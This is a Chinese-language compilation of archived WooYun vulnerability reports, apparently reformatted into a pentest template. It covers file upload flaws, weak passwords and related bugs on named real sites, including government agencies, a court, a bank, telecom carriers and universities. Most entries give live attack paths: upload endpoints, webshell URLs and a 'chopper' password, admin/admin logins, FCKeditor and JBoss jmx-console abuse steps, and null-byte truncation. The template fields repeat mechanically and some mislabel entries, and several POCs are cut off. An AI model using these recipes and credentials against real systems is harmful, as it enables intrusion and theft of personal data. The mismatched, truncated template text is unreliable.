**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 已知几个地区的系统地址mask 区域1.://**.**.**//sy.jlslgy.com_2.://**.**.**//bc.jlslgy.com/ _3.://**.**.**//ly.jlslgy.com/ _4.://**.**.**//th.jlslgy.com/ _5.://**.**.**//bs.jlslgy.com/ _6.://**.**.**//sp.jlslgy.com/ _7.://**.**.**//yb.jlslgy.com/ _*****^*****

**POC**: 举例证明任意文件上传位置http://sy.jlslgy.com/SysFun/UploadFile.htm注意发送数据是需要修改filename参数在aa.aspx后面添加空格webshell地址http://sy.jlslgy.com/UploadFile/aa.aspx密码chopper查找配置文件获取数据库连接信息登陆数据库我不是脱裤的，不进行进一步利用证明了。

**绕过**: 直接利用

**修复**: 对上传进行权限验证，并严格限制上传类型！
---

---
### [wooyun-2015-0108538] 迪蒙网贷P2P网贷系统任意用户密码重置+可遍历用户手机号码+任意删消息
**厂商**: 迪蒙网贷 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 重置任意用户密码1.打开找回密码。2.6位数字验证码。页面跳转至http://www.*.com/password/reset.html3.无错误次数和验证码失效时间进行限制，导致可暴破。遍历用户手机号码遍历一下，10分钟几十万个短信就出去了。1.修改绑定手机，已存在的手机号码，返回04。2.不存在的手机号码，没返回值。任意文件上传1.头像上传处任意删站内信1.查看站内信处

**POC**: 综上所述

**绕过**: 直接利用

**修复**: 1.增加验证2.增加验证3.增加验证4.增加验证
---

---
### [wooyun-2015-0102792] 某企业建站程序多个漏洞影响大量网站
**厂商**: 佛山市天博网络科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 佛山市天博网络科技有限公司（原缘网设计）成立于2006年，拥有多年的网站建设经验，是集网站策划、网站功能模块开发、网站美工设计、网站程序开发等专业化运作于一体的运营团队，具备承接各种规模和类型的网站设计和开发能力。为客户提供的服务项目包括：网站建设、微网站设计、微商城建设、微信营销、网站优化（SEO）、网站推广、域名申请、空间租用等,曾先后多家知名企业和机构提供了一流的网站策划和设计服务，成功帮助客户取得了良好的市场效益，获得了客户的一致好评。官网：http://www.yuanweb.cn

**POC**: 该建站程序存在多处任意上传漏洞  无需登录http://www.fsfa2008.com/admin/upfile.asphttp://www.fsfa2008.com/admin/UpFilePhoto.asp后门地址：http://www.fsfa2008.com/admin/diy.asphttp://www.gzguojing.com/admin/UpFilePhoto.asphttp://www.gzguojing.com/admin/upfile.asp后门地址：http://www.gzguojing.com/admin/diy.asphttp://www.fskuanpu.co

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2014-049301] 某建站公司开发系统存在未授权访问以及文件上传漏洞
**厂商**: 四川岂恺信息技术有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 7kai.net 分站后台存在弱口令。过滤不严.

**POC**: 选了你们客户2个案例。一个是四川成都广电。一个是雅舍装饰。均存在未授权访问。直接上传cer脚本获取shell/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-050739] 中国医药信息网后台弱口令及任意文件上传
**厂商**: 中国医药信息网 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前台：http://125.35.24.219/publish/default/后台：http://125.35.24.219/publish/default/后台登陆账户：admin/admin后台存在任意文件长传：

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 加强后台口令。
---

---
### [wooyun-2014-059582] 某通用型高校cms任意文件上传之二
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 默认配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 某通用型高校cms任意文件上传漏洞Coody 牛挖掘过上传点啊,于是踩点发现还有一个默认的编辑器,可以修改样式达到任意文件上传.关键字：inurl:info_details.jsp?seq默认编辑器地址：eWebEditor_V5.0/admin/default.jspeditor/admin/login.jsp列子：http://211.87.126.13/index/editor/admin/login.jsphttp://xggl.bjmu.edu.cn:8081/eWebEditor_V5.0/admin/default.jsphttp://www.usrn.edu.cn/eWebEditor_V5.0/admin/default.jsphttp://210.38.57.70:8180/eWebEditor_V5.0/admin/default.jsphttp://

**POC**: 默认帐号密码：admin登录发现能遍历目录发现另外一处上传漏洞.http://211.65.116.18/editorlmpz/upload.jsp<script language=javascript>config.attachSeq=-1;parent.UploadSaved('/UploadFile/1/d/08d450cc44def7e2662c83d14b4683d1.jsp');var obj=parent.dialogArguments.dialogArguments;if (!obj) obj=parent.dialogArguments;try{obj.addUploadFi

**绕过**: 直接利用

**修复**: 修改密码,过滤上传严谨。
---

---
### [wooyun-2015-0163080] 和睦家某系统修复不当导致目录遍历&配置信息泄漏
**厂商**: ufh.com.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不能过度依赖供应商，他说修复其实都是骗人的地址：http://learning.ufh.com.cn/CVS/Entrieshttp://learning.ufh.com.cn/adm/CVS/Entries

**POC**: 目录遍历http://learning.ufh.com.cn/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/../../http://learning.ufh.com.cn/wooyun.txt

**绕过**: 直接利用

**修复**: 删除CVS信息fck过滤../
---

---
### [wooyun-2012-06381] 中国联通某商城上传漏洞
**厂商**: 中国联通 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞参见WooYun: fckeditor <= 2.6.4 任意文件上传漏洞

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级或修改样式。
---

---
### [wooyun-2014-069004] 某综合管理信息系统任意文件上传
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前人经验：WooYun: 某建设集团综合管理信息系统通用注入北京清科锐华软件有限公司开发的一套施工管理系统使用了FCK，00截断文件名即可……木有太多可说的

**POC**: mask 区域1.http://**.**.**:8000/include/FCKeditor/editor/filemanager/browser/default/browser.html?connector=/include/FCKeditor/editor/filemanager/connectors/asp/upload.asp直接上传文件，抓包截断，看包返回的信息即可，不用看浏览器的信息，浏览器这会报错mask 区域1.http://**.**.**/include/FCKeditor/editor/filemanager/browser/default/browser.html?c

**绕过**: 截断攻击

**修复**: 升级FCK吧
---

---
### [wooyun-2013-025694] 计世网上传漏洞，可上传任意文件
**厂商**: 计世网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://itlianghui.ccw.com.cn/2007/upload.php

**POC**: 打开:http://itlianghui.ccw.com.cn/2007/upload.php选择大马上传后（红框内为地址）:大马地址：http://itlianghui.ccw.com.cn/2007https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201306/20130611190244161.php

**绕过**: 直接利用

**修复**: 计世网的大牛们懂得~
---

---
### [wooyun-2013-022950] 中国移动综合业务受理系统JBOSS上传漏洞
**厂商**: 中国移动通信 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国移动业务受理系统使用了JBOSS系统，JBOSS系统本身存在上传漏洞以及敏感信息。

**POC**: 地址：http://115.239.227.141:8080/jmx-console/然后在该页面中搜索“jboss.deployment”，并找到* flavor=URL,type=DeploymentScanner，然后访问链接在void addURL()函数ParamValue出填写war格式的jsp马的地址，点击invoke然后在URLList已经出现刚才的地址然后Apply Change。敏感信息：http://115.239.227.141:8080/kylin/

**绕过**: 直接利用

**修复**: 临时漏洞修补办法：给jmx-console加上访问密码1.在 ${jboss.server.home.dir}/deploy下面找到jmx-console.war目录编辑WEB-INF/web.xml文件 去掉 security-constraint 块的注释，使其起作用2.编辑WEB-INF/cl
---

---
### [wooyun-2014-062340] 山西省造价师考试系统任意文件上传漏洞
**厂商**: 山西省建造师考试系统 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://coc.jianshe99.com首先看到这个考试系统我就想到造价师的考试好像是蛮困难的。顺便看看这个站吧。随便点一个2级造价师考试系统然后进行注册之后再企业人员管理中添加人员相信大家也看到了又一个身份证上传的地方，就是这个关键地方。直接上传我的sys.jsp小马然后么  直接开菜刀连接一下然后么  这种站我感觉对于做黑产的牛来说应该有些价值，不过我是好人。我肯定不会干这种事情。我是好人。啊呜。。。。。。

**POC**: 详细说明里写的很清楚了

**绕过**: 直接利用

**修复**: 服务器上加过滤。
---

---
### [wooyun-2015-0104878] 重庆市某法院后台弱口令导致两百多位法官信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 1.重庆市九龙坡区人民法院http://www.cqjlpfy.gov.cn/2.该网站后台路径及弱口令http://www.cqjlpfy.gov.cn:8090/login.htm用户名：admin，密码：admin3.查看“通讯录管理” - “职员信息管理”，可以查看203位法官信息

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-04740] 泰安商业银行编辑器上传漏洞
**厂商**: 泰安商业银行 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.taccb.com.cn/fckeditor/editor/filemanager/connectors/test.html#

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删
---

---
### [wooyun-2014-080293] 南昌大学分站SQL注射，文件上传，后台弱口令
**厂商**: CCERT教育网应急响应组 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注入点http://qhld.ncu.edu.cn/show.asp?id=487上传点http://qhld.ncu.edu.cn/upload.asp后台http://qhld.ncu.edu.cn/login.aspusername:admin password:admin159

**POC**: 注入上传后台

**绕过**: 直接利用

**修复**: 修改后台地址，不要明文保存密码。过滤敏感字符删除上传点
---

---
### [wooyun-2012-06208] UC某测试服务器漏洞存在被渗透的风险
**厂商**: UC Mobile | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜索：site:uctest.ucweb.com存在大量测试程序，和列目录程序如：http://uctest.ucweb.com:8060/my_navi/manager/mynavclient/showmynav.phphttp://uctest.ucweb.com:81/discuzx2/ (没打补丁)http://uctest.ucweb.com:81/wml/Download/uploadlimited/wap_camera.xhtml(文件上传漏洞)数据库是root权限，由于服务上存在各种有用没用的程序，也与目前使用的应用有所关联，因此存在被进一步渗透的风险。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 应该懂。还存在uctest1-9 的部分测试服务器，都是弱点。。
---

---
### [wooyun-2012-015495] 杭州某电子商务站漏洞
**厂商**: 杭州佑康电子商务站 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台地址泄露：http://admin.96188.com/Login.aspx?returnUrl=/index.aspx而此处很蛋疼：找到个高权限用户，默认密码：123456登录后，震惊了，aspx任意上传！！！后台：上传：在商品资料基础维护任意上传：

**POC**: 杭州20万个人信息泄露！！！包括个人账户余额！

**绕过**: 直接利用

**修复**: 联系程序开发厂商！
---

---
### [wooyun-2013-038698] 广东省水利厅从后台弱口令到拿下服务器
**厂商**: 国家应急中心 | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ndj.gdwater.gov.cn/Login.aspx  此后台弱口令adminadmin后台文件上传处上传小马菜刀连之

**POC**: 翻数据库配置文件找到sa密码直接新建超级管理员执行成功   远程服务器好多站点渗透结束  不敢动任何数据

**绕过**: 直接利用

**修复**: 论弱口令的危害
---

---
### [wooyun-2013-022450] 创投圈（ctquan.com）安全渗透测试
**厂商**:  | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传图片没有限制后缀。

**POC**: http://ctquan.com/system/photos/avatars/000/004/299/original/838883634.htmhttp://ctquan.com/system/photos/avatars/000/004/300/original/1.txt

**绕过**: 直接利用

**修复**: 上传后缀限制
---

---
### [wooyun-2014-048151] 美素佳儿分站任意文件上传导致官网沦陷
**厂商**: 美素佳儿 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://test.frisochina.com/Admin/fckeditor/editor/filemanager/connectors/test.html然后导致主站被沦陷

**POC**: http://test.frisochina.com/Admin/fckeditor/editor/filemanager/connectors/test.html然后导致主站被沦陷

**绕过**: 直接利用

**修复**: 你们比我懂。
---

---
### [wooyun-2015-0118870] 某学校系统任意文件上传
**厂商**: 上海鼎创信息科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 案例如下:http://zpxx.nh.edu.sh.cn/eduplate/RES/ftb.insertFile.aspxhttp://tywx.mhedu.sh.cn/EduPlate/RES/ftb.insertFile.aspxhttp://www.peijia.com/EduPlate/RES/ftb.insertFile.aspxhttp://www.pjsyxx.com/EduPlate/RES/ftb.insertFile.aspxhttp://www.whei.cn//EduPlate/RES/ftb.insertFile.aspxhttp://www.psjm.pudong-edu.sh.cn/EduPlate/RES/ftb.insertFile.aspx1.测试案例:http://www.psjm.pudong-edu.sh.cn/EduPlate/RES/ftb.

**POC**: 1.测试案例:http://www.psjm.pudong-edu.sh.cn/EduPlate/RES/ftb.insertFile.aspxhttp://www.psjm.pudong-edu.sh.cn/images/wooyun.aspx

**绕过**: 直接利用

**修复**: 对上传的类型进行过滤,对扩展名进行白名单处理。
---

---
### [wooyun-2013-020409] phpcms的一个上传通杀0day
**厂商**: phpcms | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <img

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-048190] 某通用型在线学习管理系统存在任意文件上传及任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先说个问题。此厂商在乌云已经有账号，但是之前对此套系统的漏洞视而不见，不打算进行修复，继续将漏洞提交给他们处理，可能会危害到客户的利益，在这我建议给cert通报以促进他们进行整改。（如果要给原厂商处理，那去掉我这段话……）前大牛的漏洞：WooYun: 用友某系统存在通用型远程代码执行是用友的e-Learning存在任意文件上传和任意文件下载。不过要一个普通账户登录才可利用，当然我们可以暴力破解……没有验证码

**POC**: 首先需要一个低权限账号登录（反正没有验证码，设定好简单密码，按数字直接丢去暴了都没有问题）给出几个默认或简单密码的：http://58.214.233.113:8800/lmsv5/00041013/12345600041014/12345600041012/123456http://60.216.4.162:9091/lmsv5/107649/111111107648/111111107640/111111文件上传http://60.216.4.162:9091/lmsv5/uploadfile!LoginUploadFile.action?uploadFileType=jsp看源码：另外一

**绕过**: 直接利用

**修复**: 文件上传：只能限制了啊文件下载：也限制啊
---

---
### [wooyun-2016-0170837] 中国移动某平台存在多个漏洞
**厂商**: 中国移动 | **年份**: 2016 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国移动某平台存在多个漏洞1.目录遍历2.整站下载3.信息泄漏4.任意文件上传

**POC**: url：http://**.**.**.**/第一个，存在目录遍历漏洞http://**.**.**.**/mobile/http://**.**.**.**/images/第二个，存在整站文件打包下载第三个，信息泄漏第四个，任意文件上传可利用burp进行抓包，抓包后修改其后缀，然后再上传，就可以达到任意文件上传由于电脑burp配置不当，导致无法演示上传位置:http://**.**.**.**/Register.aspx上传后文件位置：http://**.**.**.**/uploadimages/

**绕过**: 直接利用

**修复**: 做好安全维护
---

---
### [wooyun-2014-054567] 湖北气象局编辑器文件上传漏洞
**厂商**: 湖北气象局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖北气象局FCK漏洞FCK编辑器地址可以直接谷歌搜索到，http://www.hbqx.gov.cn/FCkeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test1.html访问进去直接上传图片格式木马。http://www.hbqx.gov.cn/UploadFile/2.php;.gif

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂得~
---

---
### [wooyun-2012-014813] 海澜之家网站再次沦陷、全部信息泄漏
**厂商**: heilanhome.com | **年份**: 2012 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 刚看到乌云上有个成功入侵海澜之家网站的：WooYun: 海澜之家网站沦陷、全部信息泄漏是fckeditor的/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html上传漏洞。习惯性看了下这个页面已不存在，但是fckeditor还是存在的，自己构造上传表单提交给http://www.learnchinese.cn/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/asp/upload.asp即可上传任意文件。这个是很早以前的fckeditor Meida类型任意文件上传！

**POC**: 各种目录权限正如WyH4ck所说的，各种跨目录，各种可写！！题外话：我想说上次买了条海澜之家的西裤，水洗时候严重掉色！！（一条西裤一件短袖寸衫还500多！！）

**绕过**: 直接利用

**修复**: WyH4ck 你错了！！看来管理不专业！！！
---

---
### [wooyun-2015-095921] 台湾中国文化大学文件上传（疑似已被黑产？）
**厂商**: 台湾中国文化大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www2.pccu.edu.tw/CRB/FckEditor/存在fck编辑器，而且版本比较低。iis6.0解析。上传一句话，菜刀又连接不了。难道水土不服？咨询了下别人，给了个奇葩的一句话。可以链接，但提示有错误发生。水平不够，各种换大马，直接传发现有个hacker用户。好像目录权限限制比较死，想把马儿都传不到其他目录。未做提权测试。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 自查下吧
---

---
### [wooyun-2013-027655] 成功渗透联通wo开发者社区（来个安卓后门？）
**厂商**: 中国联通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: dev.wo.com.cn，联通的开发者社区，问题还是出自上传。为什么国字头安全这么弱？，社区当然先注册个马甲咯，登入后，我一个劲的找上传点，这种站点也就上传处有问题了。，首先是上传作品处，很多上传点，试了半天，坑爹啊，为了满足像素用了QQ截图，然后插一句话，尼玛最后发现附件插入数据库了，我擦，Q币这么难拿？然后了我的资源处，更坑爹，发现个fckeditor编辑器，一阵狂试，发现该删的都删了，上传资源图片那边，尼玛抓不到包，不知道为什么。最后来到了我的创意处，和我的资源那边差不多，当时想放弃了，可是Q币啊。。然后继续传了下，发现通过抓包该后缀名成功传上去了，，可是打开这个地址的时候慌了，因为咋看就是http 404啊，当时想哭了，，怎么赚点Q币这么难！！我不甘心，就用菜刀连了下，奇迹发生了。。。。这种设计真是奇葩。。耍人哈。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 百度
---

---
### [wooyun-2015-0114076] 安徽省淮北市旅游局官网任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安徽省淮北市旅游局官网任意文件上传漏洞

**POC**: http://www.hbsly.gov.cn/admin/module/3/file.php?filename=CPTP&id=79可上传任意格式文件直接GET webshell

**绕过**: 直接利用

**修复**: 你们懂得~
---

---
### [wooyun-2014-064240] 大汉版通JCMS某处越权+任意文件文件上传漏洞（反删除）
**厂商**: 南京大汉网络有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞点：jcms/m_5_7/replace/opr_importinfo.jsp部分系统还存在越权。fn_billstatus为1时可以直接访问该页面无需验证：http://www.shanting.gov.cn/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1http://tuoshan.yzwh.gov.cn/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1

**POC**: 扯下代码// 基本变量初始化String strFilePath = "";String strFileName = "";strFilePath = application.getRealPath("") + "/m_5_7/replace/temp/";路径就是这了，不多说，下面看关键的（省略了一部分）：CommonUploadFile upload = new CommonUploadFile(strFilePath, "");boolean bResult = upload.uploadFile(request);String strUpFileName = "";if (bResul

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2015-093814] 中国国际招标网采编系统任意文件上传至服务器沦陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cms.chinabidding.com/cms/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector绝对路径：/data/cms/bidcms/WebRoot/UserFiles/目录无执行权限，怎么办？跨目录传，但是其他目录访问都跳转到登录页了。还好有其他虚拟目录：/jiankong/权限还挺高。。不知有敏感数据否.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025507] 中国铁通-网址之家任意文件上传漏洞
**厂商**: 中国铁通 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件上传漏洞页面http://web.10050.net/Admin/Upload.asp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 只擅长挖掘
---

---
### [wooyun-2010-0134] mop动漫频道存在任意文件上传
**厂商**: 猫扑 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: dm.game.mop.com/upload.jsp 可任意上传脚本文件

**绕过**: 直接利用

**修复**: 过滤上传后缀
---

---
### [wooyun-2014-070803] 楚游圈圈某分站存在任意上传漏洞
**厂商**: 楚游圈圈 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站是楚游圈圈试玩个人中心：user.npckk.com不过貌似是个图床。以我的水平，也就读读写写了，在厉害一点的就没本事了，不过我想大神一定会有办法的。至于删除文件的按钮只是为了删除我上传的东西而存在的，并无恶意。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: = =  你们肯定比我懂。
---

---
### [wooyun-2013-036624] 广东某县政府网站存在FCKeditor任意上传漏洞
**厂商**: 广东某县政府 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址http://www.wengyuan.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector可以直接上传jsp大马

**POC**: 大马地址:http://www.wengyuan.gov.cn/UserUpLoadFiles/Image/mews/gsrc.jsp可以直接拿到服务器权限，后面就没做了！

**绕过**: 直接利用

**修复**: FCKeditor更专业
---

---
### [wooyun-2014-081868] 华思通网络会议系统任意文件上传（第一发）
**厂商**: 华思通网络技术有限公司 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 刚才看了看，这货难道属于华为吗？还是说只是合作关系？华思通网络技术有限公司是一家视频会议网络服务公司，是华为的技术合作伙伴，依托华为会议产品及技术实力，提供网络视频会议、 网络市场活动、网络培训等互联网在线服务。不管咋样，漏洞还是照常提交吧

**POC**: 先访问：http://meetinglive.teleuc.com/jsp/main/site/uploadsiteimg.jsp选好文件之后，再点一次浏览前面的对话会，然后点取消，之后回车就可以自动提交了，连exp都省了写从上图也可以看出实际上是imgsave这一个action出了问题，对应的class是com.teleuc.controller.SiteSettingControllers，一看就有漏洞嘛……public String imgsave(){String str = UUID.randomUUID() + StringUtils.getExtention(this.filel

**绕过**: 直接利用

**修复**: 限制类型。
---

---
